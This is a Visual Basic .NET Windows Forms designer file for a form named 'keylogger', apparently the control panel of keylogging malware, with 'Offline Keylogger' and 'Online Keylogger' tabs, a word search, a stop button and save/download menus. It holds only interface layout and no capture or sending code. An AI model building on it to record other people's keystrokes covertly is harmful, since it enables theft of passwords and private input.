<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class keylogger
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(keylogger))
        Me.SkyDarkForm1 = New X_Theme.SkyDarkForm()
        Me.SkyDarkButton2 = New X_Theme.SkyDarkButton()
        Me.SkyDarkButton1 = New X_Theme.SkyDarkButton()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.TextBox2 = New System.Windows.Forms.TextBox()
        Me.SkyDarkTabControl1 = New X_Theme.SkyDarkTabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.TextBox1 = New System.Windows.Forms.RichTextBox()
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.DownloadToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SaveToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.onlinetext = New System.Windows.Forms.RichTextBox()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.SkyDarkForm1.SuspendLayout()
        Me.SkyDarkTabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.SuspendLayout()
        '
        'SkyDarkForm1
        '
        Me.SkyDarkForm1.BackColor = System.Drawing.Color.FromArgb(CType(CType(62, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(58, Byte), Integer))
        Me.SkyDarkForm1.Controls.Add(Me.SkyDarkButton2)
        Me.SkyDarkForm1.Controls.Add(Me.SkyDarkButton1)
        Me.SkyDarkForm1.Controls.Add(Me.Label2)
        Me.SkyDarkForm1.Controls.Add(Me.TextBox2)
        Me.SkyDarkForm1.Controls.Add(Me.SkyDarkTabControl1)
        Me.SkyDarkForm1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.SkyDarkForm1.Location = New System.Drawing.Point(0, 0)
        Me.SkyDarkForm1.Name = "SkyDarkForm1"
        Me.SkyDarkForm1.Size = New System.Drawing.Size(626, 608)
        Me.SkyDarkForm1.TabIndex = 0
        Me.SkyDarkForm1.Text = "Key Logger "
        '
        'SkyDarkButton2
        '
        Me.SkyDarkButton2.Location = New System.Drawing.Point(259, 63)
        Me.SkyDarkButton2.Name = "SkyDarkButton2"
        Me.SkyDarkButton2.Size = New System.Drawing.Size(126, 23)
        Me.SkyDarkButton2.TabIndex = 25
        Me.SkyDarkButton2.Text = "Stop Online Keylogger"
        '
        'SkyDarkButton1
        '
        Me.SkyDarkButton1.Location = New System.Drawing.Point(544, 31)
        Me.SkyDarkButton1.Name = "SkyDarkButton1"
        Me.SkyDarkButton1.Size = New System.Drawing.Size(75, 23)
        Me.SkyDarkButton1.TabIndex = 24
        Me.SkyDarkButton1.Text = "Search"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.BackColor = System.Drawing.Color.Transparent
        Me.Label2.ForeColor = System.Drawing.Color.Red
        Me.Label2.Location = New System.Drawing.Point(8, 36)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(79, 13)
        Me.Label2.TabIndex = 23
        Me.Label2.Text = "Serach A Word"
        '
        'TextBox2
        '
        Me.TextBox2.BackColor = System.Drawing.Color.FromArgb(CType(CType(62, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(58, Byte), Integer))
        Me.TextBox2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox2.ForeColor = System.Drawing.Color.White
        Me.TextBox2.Location = New System.Drawing.Point(96, 28)
        Me.TextBox2.Multiline = True
        Me.TextBox2.Name = "TextBox2"
        Me.TextBox2.Size = New System.Drawing.Size(442, 28)
        Me.TextBox2.TabIndex = 22
        '
        'SkyDarkTabControl1
        '
        Me.SkyDarkTabControl1.Controls.Add(Me.TabPage1)
        Me.SkyDarkTabControl1.Controls.Add(Me.TabPage2)
        Me.SkyDarkTabControl1.Location = New System.Drawing.Point(3, 62)
        Me.SkyDarkTabControl1.Name = "SkyDarkTabControl1"
        Me.SkyDarkTabControl1.SelectedIndex = 0
        Me.SkyDarkTabControl1.Size = New System.Drawing.Size(620, 543)
        Me.SkyDarkTabControl1.TabIndex = 2
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(62, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(58, Byte), Integer))
        Me.TabPage1.Controls.Add(Me.TextBox1)
        Me.TabPage1.Location = New System.Drawing.Point(4, 25)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(612, 514)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Offline Keylogger"
        '
        'TextBox1
        '
        Me.TextBox1.BackColor = System.Drawing.Color.FromArgb(CType(CType(62, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(58, Byte), Integer))
        Me.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.TextBox1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TextBox1.ForeColor = System.Drawing.SystemColors.Window
        Me.TextBox1.Location = New System.Drawing.Point(3, 3)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(606, 508)
        Me.TextBox1.TabIndex = 23
        Me.TextBox1.Text = ""
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DownloadToolStripMenuItem, Me.SaveToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(129, 48)
        '
        'DownloadToolStripMenuItem
        '
        Me.DownloadToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(62, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(58, Byte), Integer))
        Me.DownloadToolStripMenuItem.ForeColor = System.Drawing.Color.Lime
        Me.DownloadToolStripMenuItem.Image = CType(resources.GetObject("DownloadToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DownloadToolStripMenuItem.Name = "DownloadToolStripMenuItem"
        Me.DownloadToolStripMenuItem.Size = New System.Drawing.Size(128, 22)
        Me.DownloadToolStripMenuItem.Text = "Download"
        '
        'SaveToolStripMenuItem
        '
        Me.SaveToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(62, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(58, Byte), Integer))
        Me.SaveToolStripMenuItem.ForeColor = System.Drawing.Color.Lime
        Me.SaveToolStripMenuItem.Image = CType(resources.GetObject("SaveToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem"
        Me.SaveToolStripMenuItem.Size = New System.Drawing.Size(128, 22)
        Me.SaveToolStripMenuItem.Text = "Save"
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(62, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(58, Byte), Integer))
        Me.TabPage2.Controls.Add(Me.onlinetext)
        Me.TabPage2.Location = New System.Drawing.Point(4, 25)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(612, 514)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Online Keylogger"
        '
        'onlinetext
        '
        Me.onlinetext.BackColor = System.Drawing.Color.FromArgb(CType(CType(62, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(58, Byte), Integer))
        Me.onlinetext.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.onlinetext.ContextMenuStrip = Me.ContextMenuStrip1
        Me.onlinetext.Dock = System.Windows.Forms.DockStyle.Fill
        Me.onlinetext.ForeColor = System.Drawing.SystemColors.Window
        Me.onlinetext.Location = New System.Drawing.Point(3, 3)
        Me.onlinetext.Name = "onlinetext"
        Me.onlinetext.Size = New System.Drawing.Size(606, 508)
        Me.onlinetext.TabIndex = 24
        Me.onlinetext.Text = ""
        '
        'Timer1
        '
        Me.Timer1.Interval = 1000
        '
        'keylogger
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(626, 608)
        Me.Controls.Add(Me.SkyDarkForm1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Name = "keylogger"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "keylogger"
        Me.SkyDarkForm1.ResumeLayout(False)
        Me.SkyDarkForm1.PerformLayout()
        Me.SkyDarkTabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.TabPage2.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents SkyDarkForm1 As X_Theme.SkyDarkForm
    Friend WithEvents SkyDarkTabControl1 As X_Theme.SkyDarkTabControl
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents DownloadToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SaveToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents TextBox1 As System.Windows.Forms.RichTextBox
    Friend WithEvents onlinetext As System.Windows.Forms.RichTextBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents TextBox2 As System.Windows.Forms.TextBox
    Friend WithEvents SkyDarkButton1 As X_Theme.SkyDarkButton
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents SkyDarkButton2 As X_Theme.SkyDarkButton
End Class
